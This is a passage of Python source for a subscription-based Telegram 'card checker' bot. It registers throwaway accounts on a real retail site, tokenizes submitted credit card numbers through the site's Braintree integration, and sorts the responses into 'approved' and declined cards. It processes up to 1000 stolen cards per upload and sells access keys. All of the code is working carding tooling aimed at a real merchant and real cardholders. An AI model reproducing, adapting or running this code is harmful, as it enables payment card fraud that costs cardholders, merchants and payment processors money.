            'query': 'mutation TokenizeCreditCard(`${input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input:}$`input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': '20' + yy,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        req = r.post('https://payments.braintreegateway.com/graphql', headers=headers, json=json_data)
        tok = req.json()['data']['tokenizeCreditCard']['token']

        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.bebebrands.com',
            'referer': 'https://www.bebebrands.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        data = [
            ('payment_method', 'braintree_credit_card'),
            ('wc-braintree-credit-card-card-type', 'visa'),
            ('wc-braintree-credit-card-3d-secure-enabled', ''),
            ('wc-braintree-credit-card-3d-secure-verified', ''),
            ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
            ('wc_braintree_credit_card_payment_nonce', tok),
            ('wc_braintree_device_data', '{"correlation_id":"5d54fe3a278571391a5e84cb4c647852"}'),
            ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
            ('wc_braintree_paypal_payment_nonce', ''),
            ('wc_braintree_device_data', '{"correlation_id":"5d54fe3a278571391a5e84cb4c647852"}'),
            ('wc-braintree-paypal-context', 'shortcode'),
            ('wc_braintree_paypal_amount', '0.00'),
            ('wc_braintree_paypal_currency', 'GBP'),
            ('wc_braintree_paypal_locale', 'en_gb'),
            ('wc-braintree-paypal-tokenize-payment-method', 'true'),
            ('woocommerce-add-payment-method-nonce', noncec),
            ('_wp_http_referer', '/my-account/add-payment-method/'),
            ('woocommerce_add_payment_method', '1'),
        ]

        req = r.post('https://www.bebebrands.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)

        error_message = (
            req.text.split('class="message-container')[1]
            .split('</div>')[0]
            .split('>')[-1]
            .strip()
        )

        if req.status_code == 200 or req.status_code == 201:
            return {
                "status": "Approved ✅",
                "response": "Nice! New payment method added",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hits": "YES"
            }
        elif "avs" in error_message:
            return {
                "status": "Approved ✅",
                "response": error_message.replace(
                    "Your payment could not be taken. Please try again or use a different payment method.",
                    ""
                ).strip(),
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hits": "YES"
            }
        elif "Card Issuer Declined CVV" in error_message:
            return {
                "status": "Approved ✅",
                "response": "CCN MATCHED",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hits": "YES"
            }
        elif "Insufficient Funds" in error_message:
            return {
                "status": "Approved ✅",
                "response": "CCN MATCHED",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hits": "YES"
            }
        elif "Status code cvv: Gateway Rejected: cvv" in error_message:
            return {
                "status": "Declined ❌",
                "response": "Gateway Rejected: cvv",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hits": "NO"
            }
        elif "Declined - Call Issuer" in error_message:
            return {
                "status": "Declined ❌",
                "response": "Declined - Call Issuer",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hits": "NO"
            }
        elif "Cannot Authorize at this time" in error_message:
            return {
                "status": "Declined ❌",
                "response": "Cannot Authorize at this time",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hits": "NO"
            }
        elif "Processor Declined - Fraud Suspected" in error_message:
            return {
                "status": "Declined ❌",
                "response": "Fraud Suspected",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hits": "NO"
            }
        elif "Status code risk_threshold: Gateway Rejected: risk_threshold" in error_message:
            return {
                "status": "Declined ❌",
                "response": "Gateway Rejected: risk_threshold",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hits": "NO"
            }
        elif "We're sorry, but the payment validation failed. Declined - Call Issuer" in error_message or \
             "Payment failed: Declined - Call Issuer" in error_message:
            return {
                "status": "Declined ❌",
                "response": "Declined - Call Issuer",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hits": "NO"
            }
        elif "ProxyError" in error_message:
            return {
                "status": "Declined ❌",
                "response": "Proxy Connection Refused",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hits": "NO"
            }
        else:
            return {
                "status": "Declined ❌",
                "response": error_message,
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hits": "NO"
            }
    except Exception as e:
        return {
            "status": "Declined ❌",
            "response": str(e),
            "fullz": f"{cc}|{mm}|{yy}|{cvv}",
            "hits": "NO"
        }



def check_braintree_auth(combo):
    r = requests.Session()
    if len(combo) != 4:
        return "Invalid input format. Use cc|mm|yy|cvv."
    cc, mm, yy, cvv = combo
    mm = mm.zfill(2)
    yy = yy[-2:]
    try:
        start_time = time.time()
        user = generate_user_agent()
        acc = generate_random_account()
        username = generate_username()
        corr = generate_random_code()
        sess = generate_random_code()

        headers = {
    'authority': 'www.bebebrands.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

        req = r.get('https://www.bebebrands.com/my-account/', headers=headers)

        nonce = re.search(r'id="woocommerce-register-nonce".*?value="(.*?)"', req.text).group(1)


        headers = {
    'authority': 'www.bebebrands.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.bebebrands.com',
    'referer': 'https://www.bebebrands.com/my-account/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

        data = {
    'username': username,
    'email': acc,
    'password': 'qhabLxTm!av1iYk',
    'wc_order_attribution_source_type': 'typein',
    'wc_order_attribution_referrer': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_utm_source_platform': '(none)',
    'wc_order_attribution_utm_creative_format': '(none)',
    'wc_order_attribution_utm_marketing_tactic': '(none)',
    'wc_order_attribution_session_entry': 'https://www.bebebrands.com/my-account/',
    'wc_order_attribution_session_start_time': '2025-03-26 02:12:13',
    'wc_order_attribution_session_pages': '1',
    'wc_order_attribution_session_count': '1',
    'wc_order_attribution_user_agent': user,
    'woocommerce-register-nonce': nonce,
    '_wp_http_referer': '/my-account/',
    'register': 'Register',
}

        req =  r.post('https://www.bebebrands.com/my-account/', cookies=r.cookies, headers=headers, data=data)

        headers = {
    'authority': 'www.bebebrands.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://www.bebebrands.com/my-account/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

        req = r.get('https://www.bebebrands.com/my-account/edit-address/', cookies=r.cookies, headers=headers)
        
        headers = {
    'authority': 'www.bebebrands.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://www.bebebrands.com/my-account/edit-address/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

        req = r.get('https://www.bebebrands.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
        
        bill = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', req.text).group(1)
        
        headers = {
    'authority': 'www.bebebrands.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.bebebrands.com',
    'referer': 'https://www.bebebrands.com/my-account/edit-address/billing/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

        data = {
    'billing_first_name': 'Baign',
    'billing_last_name': 'Raja',
    'billing_company': '',
    'billing_country': 'GB',
    'billing_address_1': '32300 116th St',
    'billing_address_2': '',
    'billing_city': 'Wilmot',
    'billing_state': '',
    'billing_postcode': 'SA11 1NU',
    'billing_phone': '8473614926',
    'billing_email': acc,
    'save_address': 'Save address',
    'woocommerce-edit-address-nonce': bill,
    '_wp_http_referer': '/my-account/edit-address/billing/',
    'action': 'edit_address',
}

        req = r.post(
    'https://www.bebebrands.com/my-account/edit-address/billing/',
    cookies=r.cookies,
    headers=headers,
    data=data,
)

        headers = {
    'authority': 'www.bebebrands.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://www.bebebrands.com/my-account/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

        req = r.get('https://www.bebebrands.com/my-account/payment-methods/', cookies=r.cookies, headers=headers)
        
        headers = {
    'authority': 'www.bebebrands.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://www.bebebrands.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

        req = r.get('https://www.bebebrands.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
        
        client_token = parseX(req.text, '"client_token_nonce":"', '"')
        noncec = parseX(req.text, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '" />')
        
        headers = {
    'authority': 'www.bebebrands.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.bebebrands.com',
    'referer': 'https://www.bebebrands.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}

        data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client_token,
}

        req = r.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
        
        token= req.json()['data']
        token = json.loads(base64.b64decode(token))['authorizationFingerprint']
        
        headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {token}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

        json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': str(uuid.uuid4()),
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': cc,
                'expirationMonth': mm,
                'expirationYear': '20' + yy,
                'cvv': cvv,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

        req = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        tok = req.json()['data']['tokenizeCreditCard']['token']
        
        headers = {
    'authority': 'www.bebebrands.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.bebebrands.com',
    'referer': 'https://www.bebebrands.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

        data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'visa'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', tok),
    ('wc_braintree_device_data', '{"correlation_id":"5d54fe3a278571391a5e84cb4c647852"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"5d54fe3a278571391a5e84cb4c647852"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'GBP'),
    ('wc_braintree_paypal_locale', 'en_gb'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', noncec),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]

        req = r.post('https://www.bebebrands.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)


        error_message = (req.text.split('class="message-container')[1].split('</div>')[0].split('>')[-1].strip())

        if "added" in error_message:
            return {
                "status": "Approved ✅",
                "response": "Nice! New payment method added",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hit": "YES"
            }
        elif "avs" in error_message:
            return {
                "status": "Approved ✅",
                "response": error_message.replace(
                    "Your payment could not be taken. Please try again or use a different payment method.",
                    ""
                ).strip(),
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hit": "YES"
            }
        elif "Card Issuer Declined CVV" in error_message:
            return {
                "status": "Approved ✅",
                "response": "CCN MATCHED",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hit": "YES"
            }
        elif "Insufficient Funds" in error_message:
            return {
                "status": "Approved ✅",
                "response": "CCN MATCHED",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hit": "YES"
            }
        elif "Status code cvv: Gateway Rejected: cvv" in error_message:
            return {
                "status": "Declined ❌",
                "response": "Gateway Rejected: cvv",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hit": "NO"
            }
        elif "Declined - Call Issuer" in error_message:
            return {
                "status": "Declined ❌",
                "response": "Declined - Call Issuer",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hit": "NO"
            }
        elif "Cannot Authorize at this time" in error_message:
            return {
                "status": "Declined ❌",
                "response": "Cannot Authorize at this time",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hit": "NO"
            }
        elif "Processor Declined - Fraud Suspected" in error_message:
            return {
                "status": "Declined ❌",
                "response": "Fraud Suspected",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hit": "NO"
            }
        elif "Status code risk_threshold: Gateway Rejected: risk_threshold" in error_message:
            return {
                "status": "Declined ❌",
                "response": "Gateway Rejected: risk_threshold",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hit": "NO"
            }
        elif "We're sorry, but the payment validation failed. Declined - Call Issuer" in error_message or \
             "Payment failed: Declined - Call Issuer" in error_message:
            return {
                "status": "Declined ❌",
                "response": "Declined - Call Issuer",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hit": "NO"
            }
        elif "ProxyError" in error_message:
            return {
                "status": "Declined ❌",
                "response": "Proxy Connection Refused",
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hit": "NO"
            }
        else:
            return {
                "status": "Declined ❌",
                "response": error_message,
                "fullz": f"{cc}|{mm}|{yy}|{cvv}",
                "hits": "NO"
            }
    except Exception as e:
        return {
            "status": "Declined ❌",
            "response": str(e),
            "fullz": f"{cc}|{mm}|{yy}|{cvv}",
            "hit": "NO"
        }


def generate_key(plan):
    if plan not in plans:
        return "Invalid plan. Available plans are: " + ", ".join(plans.keys())
    key = f"SUB-{plan.upper()}-{funca()}-{datetime.now() + plans[plan]['duration']}"
    expiry_date = datetime.now() + plans[plan]['duration']
    with open(f'data/keys/{key}.txt', 'w') as f:
        f.write(f"{key}|{plan}|{expiry_date.strftime('%Y-%m-%d')}|unused")
    return f"Generated key: {key}"

def redeem_key(key, context):
    key_file = f'data/keys/{key}.txt'
    if not os.path.exists(key_file):
        return "Invalid or already used key."
    with open(key_file, 'r') as f:
        key_data = f.read().strip().split('|')
        if key_data[3] == 'used':
            return "Invalid or already used key. Please Buy from @BaignX"
        plan = key_data[1]
        expiry_date = key_data[2]
    user_id = context.user_data.get('user_id')
    with open(f'data/subscriptions/{user_id}.txt', 'w') as f:
        f.write(f"{plan}|{expiry_date}")
    with open(key_file, 'w') as f:
        f.write(f"{key}|{plan}|{expiry_date}|used")
    return f"Key redeemed successfully! Plan: {plan}, Expiry: {expiry_date}\n\nThanks for purchasing!\nRegards @BaignX and @kimm_junggg"

def check_subscription(user_id):
    subscription_file = f'data/subscriptions/{user_id}.txt'
    if not os.path.exists(subscription_file):
        return "No active subscription."
    with open(subscription_file, 'r') as f:
        plan, expiry_date = f.read().strip().split('|')
        expiry_date = datetime.strptime(expiry_date, '%Y-%m-%d')
        if datetime.now() < expiry_date:
            return f"Active subscription. Plan: {plan}, Expiry: {expiry_date.strftime('%Y-%m-%d')}"
        else:
            return "Subscription expired."

def is_admin(user_id):
    return user_id in admin_ids

def is_owner(user_id):
    return user_id in owner_ids

def is_registered(user_id):
    return os.path.exists(f'data/registered_users/{user_id}.txt')

async def mstr_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if not is_admin(user_id) and not is_owner(user_id):
        subscription_status = check_subscription(user_id)
        if "No active subscription" in subscription_status:
            await update.message.reply_text("🚫 **You do not have an active subscription.** 🚫\n\nPlease subscribe using /subscribe.")
            return
        elif "Subscription expired" in subscription_status:
            await update.message.reply_text("🕒 **Your subscription has expired.** 🕒\n\nPlease renew using /subscribe.")
            return

    message = update.message.text
    if message.startswith('/mstr '):
        combos = message[len('/mstr '):].strip().split('\n')
        if len(combos) > 15:
            await update.message.reply_text(
                f"📋 **Maximum 15 credit cards allowed.** 📋"
            )
            return

        total_ccs = len(combos)
        charged_count = 0
        declined_count = 0

        processing_message = await update.message.reply_text(
            f"🔄 **Processing {total_ccs} CCs...** 🔄\n\n"
            f"💳 **CHARGED:** {charged_count}\n"
            f"❌ **DECLINED:** {declined_count}"
        )

        approved_ccs = []

        for combo in combos:
            if context.user_data.get('stop'):
                break
            combo_parts = combo.split('|')
            if len(combo_parts) != 4:
                await update.message.reply_text(f"🚫 **Invalid format:** {combo}")
                continue

            result = check_stripe_charge(combo_parts)
            if "Charged 1$ 🔥" in result:
                charged_count += 1
                approved_ccs.append(combo)
                await update.message.reply_text(result)  # Send charged CCs separately
            else:
                declined_count += 1

            await processing_message.edit_text(
                f"🔄 **Processing {total_ccs} CCs...** 🔄\n\n"
                f"💳 **CHARGED:** {charged_count}\n"
                f"❌ **DECLINED:** {declined_count}"
            )
            await asyncio.sleep(1)

        if approved_ccs:
            with open("approved_ccs.txt", "w") as file:
                file.write("\n".join(approved_ccs))
            await update.message.reply_document(document=open("approved_ccs.txt", "rb"))

        context.user_data['stop'] = False

    else:
        await update.message.reply_text("📋 **Please send the command with credit card details in the format:** /mstr cc|mm|yy|cvv")

async def str_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if not is_admin(user_id) and not is_owner(user_id):
        subscription_status = check_subscription(user_id)
        if "No active subscription" in subscription_status:
            await update.message.reply_text("🚫 **You do not have an active subscription.** 🚫\n\nPlease subscribe using /subscribe.")
            return
        elif "Subscription expired" in subscription_status:
            await update.message.reply_text("🕒 **Your subscription has expired.** 🕒\n\nPlease renew using /subscribe.")
            return

    message = update.message.text
    if message.startswith('/str '):
        combo = message[len('/str '):].split('|')
        if len(combo) != 4:
            await update.message.reply_text("🚫 **Invalid input format. Use cc|mm|yy|cvv.**")
            return

        processing_message = await update.message.reply_text("🔄 **Processing...** 🔄")
        result = check_stripe_charge(combo)
        await processing_message.edit_text(result)
    else:
        await update.message.reply_text("📋 **Please send the command with credit card details in the format:** /str cc|mm|yy|cvv")

async def strtxt_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if not is_admin(user_id) and not is_owner(user_id):
        subscription_status = check_subscription(user_id)
        if "No active subscription" in subscription_status:
            await update.message.reply_text("🚫 **You do not have an active subscription.** 🚫\n\nPlease subscribe using /subscribe.")
            return
        elif "Subscription expired" in subscription_status:
            await update.message.reply_text("🕒 **Your subscription has expired.** 🕒\n\nPlease renew using /subscribe.")
            return

    await update.message.reply_text("📄 **Please send the TXT file containing the credit card details.**")

    context.user_data['waiting_for_file'] = True

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if context.user_data.get('waiting_for_file'):
        if update.message.document is None:
            await update.message.reply_text("🚫 **Please send a valid TXT file containing the credit card details.**")
            return

        file = await update.message.document.get_file()
        file_path = await file.download_to_drive()

        with open(file_path, 'r') as f:
            combos = f.read().strip().split('\n')

        if len(combos) > 1000:
            await update.message.reply_text("📋 **Maximum 1000 credit cards allowed.**")
            return

        total_ccs = len(combos)
        charged_count = 0
        declined_count = 0

        processing_message = await update.message.reply_text(
            f"🔄 **Processing {total_ccs} CCs...** 🔄\n\n"
            f"💳 **CHARGED:** {charged_count}\n"
            f"❌ **DECLINED:** {declined_count}"
        )

        approved_ccs = []

        for combo in combos:
            if context.user_data.get('stop'):
                break
            combo_parts = combo.split('|')
            if len(combo_parts) != 4:
                await update.message.reply_text(f"🚫 **Invalid format:** {combo}")
                continue

            result = check_stripe_charge(combo_parts)
            if "Charged 1$ 🔥" in result:
                charged_count += 1
                approved_ccs.append(combo)
                await update.message.reply_text(result)  # Send charged CCs separately
            else:
                declined_count += 1

            await processing_message.edit_text(
                f"🔄 **Processing {total_ccs} CCs...** 🔄\n\n"
                f"💳 **CHARGED:** {charged_count}\n"
                f"❌ **DECLINED:** {declined_count}"
            )
            await asyncio.sleep(1)

        if approved_ccs:
            with open("approved_ccs.txt", "w") as file:
                file.write("\n".join(approved_ccs))
            await update.message.reply_document(document=open("approved_ccs.txt", "rb"))

        context.user_data['waiting_for_file'] = False
        context.user_data['stop'] = False

async def mstra_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if not is_admin(user_id) and not is_owner(user_id):
        subscription_status = check_subscription(user_id)
        if "No active subscription" in subscription_status:
            await update.message.reply_text("🚫 **You do not have an active subscription.** 🚫\n\nPlease subscribe using /subscribe.")
            return
        elif "Subscription expired" in subscription_status:
            await update.message.reply_text("🕒 **Your subscription has expired.** 🕒\n\nPlease renew using /subscribe.")
            return

    message = update.message.text
    if message.startswith('/mstra '):
        combos = message[len('/mstra '):].strip().split('\n')
        if len(combos) > 15:
            await update.message.reply_text(
                f"📋 **Maximum 15 credit cards allowed.** 📋"
            )
            return

        total_ccs = len(combos)
        approved_count = 0
        declined_count = 0

        processing_message = await update.message.reply_text(
            f"🔄 **Processing {total_ccs} CCs...** 🔄\n\n"
            f"✅ **APPROVED:** {approved_count}\n"
            f"❌ **DECLINED:** {declined_count}"
        )

        approved_ccs = []

        for combo in combos:
            if context.user_data.get('stop'):
                break
            combo_parts = combo.split('|')
            if len(combo_parts) != 4:
                await update.message.reply_text(f"🚫 **Invalid format:** {combo}")
                continue

            result = check_stripe_auth(combo_parts)
            if "Approved ✅" in result or "3DS Approved ✅" in result or "CCN MATCHED ✅" in result:
                approved_count += 1
                approved_ccs.append(combo)
                await update.message.reply_text(result)  # Send approved CCs separately
            else:
                declined_count += 1

            await processing_message.edit_text(
                f"🔄 **Processing {total_ccs} CCs...** 🔄\n\n"
                f"✅ **APPROVED:** {approved_count}\n"
                f"❌ **DECLINED:** {declined_count}"
            )
            await asyncio.sleep(1)

        if approved_ccs:
            with open("approved_ccs.txt", "w") as file:
                file.write("\n".join(approved_ccs))
            await update.message.reply_document(document=open("approved_ccs.txt", "rb"))

        context.user_data['stop'] = False

    else:
        await update.message.reply_text("📋 **Please send the command with credit card details in the format:** /mstra cc|mm|yy|cvv")

async def stra_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if not is_admin(user_id) and not is_owner(user_id):
        subscription_status = check_subscription(user_id)
        if "No active subscription" in subscription_status:
            await update.message.reply_text("🚫 **You do not have an active subscription.** 🚫\n\nPlease subscribe using /subscribe.")
            return
        elif "Subscription expired" in subscription_status:
            await update.message.reply_text("🕒 **Your subscription has expired.** 🕒\n\nPlease renew using /subscribe.")
            return

    message = update.message.text
    if message.startswith('/stra '):
        combo = message[len('/stra '):].split('|')
        if len(combo) != 4:
            await update.message.reply_text("🚫 **Invalid input format. Use cc|mm|yy|cvv.**")
            return

        processing_message = await update.message.reply_text("🔄 **Processing...** 🔄")
        result = check_stripe_auth(combo)
        await processing_message.edit_text(result)
    else:
        await update.message.reply_text("📋 **Please send the command with credit card details in the format:** /stra cc|mm|yy|cvv")

async def strtxta_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if not is_admin(user_id) and not is_owner(user_id):
        subscription_status = check_subscription(user_id)
        if "No active subscription" in subscription_status:
            await update.message.reply_text("🚫 **You do not have an active subscription.** 🚫\n\nPlease subscribe using /subscribe.")
